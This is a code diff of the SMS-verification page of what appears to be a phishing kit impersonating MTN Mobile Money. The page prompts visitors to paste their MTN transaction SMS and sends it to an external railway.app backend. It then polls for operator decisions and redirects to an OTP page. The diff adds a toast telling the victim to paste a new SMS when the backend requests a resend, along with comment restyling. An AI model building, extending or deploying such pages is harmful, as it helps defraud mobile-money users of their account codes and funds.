@@ -31,6 +31,7 @@
             gap: 10px;
         }
 
+        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -79,6 +80,7 @@
             white-space: nowrap;
         }
 
+        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
@@ -93,6 +95,7 @@
             overflow-y: auto;
         }
 
+        /* ===== ICON BADGE ===== */
         .icon-badge {
             width: 60px;
             height: 60px;
@@ -134,6 +137,7 @@
             font-weight: 700;
         }
 
+        /* ===== STEP HINT ===== */
         .step-hint {
             background: #f8f9ff;
             border-radius: 12px;
@@ -161,6 +165,7 @@
             color: #0047AB;
         }
 
+        /* ===== SMS TEXTAREA ===== */
         .sms-wrapper {
             position: relative;
             margin-bottom: 6px;
@@ -246,6 +251,7 @@
         }
         .error-text.show { display: block; }
 
+        /* ===== RESEND ROW ===== */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -276,6 +282,7 @@
         .resend-link:hover:not(:disabled) { background: #f0f4ff; }
         .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
+        /* ===== VERIFY BUTTON ===== */
         .verify-btn {
             width: 100%;
             padding: 15px;
@@ -312,6 +319,7 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
+        /* ===== SECURITY NOTICE ===== */
         .security-notice {
             display: flex;
             align-items: flex-start;
@@ -326,6 +334,7 @@
             flex-shrink: 0;
         }
 
+        /* ===== FOOTER ===== */
         footer {
             padding: 6px;
             color: #aaa;
@@ -336,6 +345,7 @@
             flex-shrink: 0;
         }
 
+        /* ===== SMALL PHONES ===== */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
             .icon-badge {
@@ -551,15 +561,16 @@
     </div>
 
     <script>
-        // ============================================
-        // BACKEND URL
-        // ============================================
+        /* ============================================
+           BACKEND URL
+        ============================================ */
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
+        const RESEND_TOAST_COOLDOWN_MS = 30 * 1000;
 
-        // ============================================
-        // DOM REFERENCES
-        // ============================================
+        /* ============================================
+           DOM REFERENCES
+        ============================================ */
         const smsInput = document.getElementById('smsInput');
         const pasteBtn = document.getElementById('pasteBtn');
         const charCount = document.getElementById('charCount');
@@ -572,9 +583,9 @@
         const verifyTitle = document.getElementById('verifyTitle');
         const verifySubtitle = document.getElementById('verifySubtitle');
 
-        // ============================================
-        // SESSION CHECK
-        // ============================================
+        /* ============================================
+           SESSION CHECK
+        ============================================ */
         const sessionRaw = localStorage.getItem('momoSession');
         if (!sessionRaw) {
             window.location.href = 'login.html';
@@ -584,9 +595,9 @@
 
         const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
 
-        // ============================================
-        // SMS INPUT HANDLING
-        // ============================================
+        /* ============================================
+           SMS INPUT HANDLING
+        ============================================ */
         const MIN_LENGTH = 20;
         const MTN_KEYWORDS = ['mtn', 'momo', 'transaction', 'ref', 'amount', 'xaf', 'confirmed', 'received', 'sent'];
 
@@ -622,9 +633,9 @@
             }, 0);
         });
 
-        // ============================================
-        // PASTE BUTTON
-        // ============================================
+        /* ============================================
+           PASTE BUTTON
+        ============================================ */
         pasteBtn.addEventListener('click', async function() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -648,9 +659,9 @@
             }
         });
 
-        // ============================================
-        // RESEND COUNTDOWN
-        // ============================================
+        /* ============================================
+           RESEND COUNTDOWN
+        ============================================ */
         let remaining = 60;
         let resendTimer = null;
 
@@ -686,15 +697,15 @@
             startCountdown();
         });
 
-        // ============================================
-        // VERIFY OVERLAY
-        // ============================================
+        /* ============================================
+           VERIFY OVERLAY
+        ============================================ */
         let verifyTimer = null;
 
         function startVerifyBar() {
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
-            verifyBarFill.style.background = '';  /* reset in case it was red */
+            verifyBarFill.style.background = '';
             const startTime = Date.now();
 
             verifyTimer = setInterval(function() {
@@ -709,12 +720,6 @@
             verifyBarFill.style.width = '100%';
         }
 
-        function hideVerifyOverlay() {
-            if (verifyTimer) clearInterval(verifyTimer);
-            verifyOverlay.classList.remove('show');
-        }
-
-        /* Show rejection state in overlay, then return to form */
         function showRejection(reason) {
             if (verifyTimer) clearInterval(verifyTimer);
             verifyBarFill.style.width = '100%';
@@ -738,9 +743,58 @@
             }, 1800);
         }
 
-        // ============================================
-        // POLLING
-        // ============================================
+        /* ============================================
+           RESEND TOAST (30s cooldown)
+        ============================================ */
+        let lastResendToastAt = 0;
+
+        function showResendToast() {
+            const now = Date.now();
+            if (now - lastResendToastAt < RESEND_TOAST_COOLDOWN_MS) return;
+            lastResendToastAt = now;
+
+            let toast = document.getElementById('resendToast');
+            if (!toast) {
+                toast = document.createElement('div');
+                toast.id = 'resendToast';
+                toast.style.cssText = `
+                    position: fixed;
+                    left: 50%;
+                    bottom: 24px;
+                    transform: translateX(-50%) translateY(20px);
+                    background: #0047AB;
+                    color: #fff;
+                    padding: 14px 22px;
+                    border-radius: 14px;
+                    font-weight: 700;
+                    font-size: 13.5px;
+                    box-shadow: 0 12px 32px rgba(0,71,171,0.4);
+                    z-index: 9999;
+                    opacity: 0;
+                    transition: opacity 0.3s ease, transform 0.3s ease;
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    max-width: 90vw;
+                `;
+                toast.innerHTML = '<span>📩</span><span>SMS resent — please paste the new one</span>';
+                document.body.appendChild(toast);
+            }
+
+            requestAnimationFrame(() => {
+                toast.style.opacity = '1';
+                toast.style.transform = 'translateX(-50%) translateY(0)';
+            });
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(-50%) translateY(20px)';
+            }, 3500);
+        }
+
+        /* ============================================
+           POLLING
+        ============================================ */
         let pollTimer = null;
 
         function stopPolling() {
@@ -771,6 +825,9 @@
                             window.location.href = 'verify-otp.html';
                         }, 350);
 
+                    } else if (data.status === 'resend_requested') {
+                        showResendToast();
+
                     } else if (data.status === 'rejected') {
                         stopPolling();
                         showRejection({
@@ -793,9 +850,9 @@
             }, POLL_INTERVAL_MS);
         }
 
-        // ============================================
-        // VERIFY BUTTON
-        // ============================================
+        /* ============================================
+           VERIFY BUTTON
+        ============================================ */
         verifyBtn.addEventListener('click', async function() {
             const text = smsInput.value.trim();
 
@@ -844,7 +901,6 @@
                     throw new Error(data.error || 'Verification failed');
                 }
 
-                /* Show overlay and start polling */
                 startVerifyBar();
                 startPolling(data.sessionId);
 
@@ -861,9 +917,9 @@
             }
         });
 
-        // ============================================
-        // INIT
-        // ============================================
+        /* ============================================
+           INIT
+        ============================================ */
         updateCharCount();
         updateVerifyState();
     </script>
